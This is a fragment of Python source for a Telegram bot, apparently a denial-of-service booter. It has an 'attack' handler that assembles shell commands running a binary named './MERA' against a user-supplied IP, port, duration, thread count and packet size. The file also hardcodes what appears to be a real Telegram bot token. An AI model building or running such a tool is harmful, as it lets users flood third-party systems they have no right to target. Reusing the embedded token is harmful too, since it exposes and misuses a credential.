...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7635879265:AAENJHvoFoQVX1mgzoLT8nJvnMTtIBMBXE0'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./MERA {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./MERA {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./MERA {ip} {port} {duration} {byte_size} {threads}"
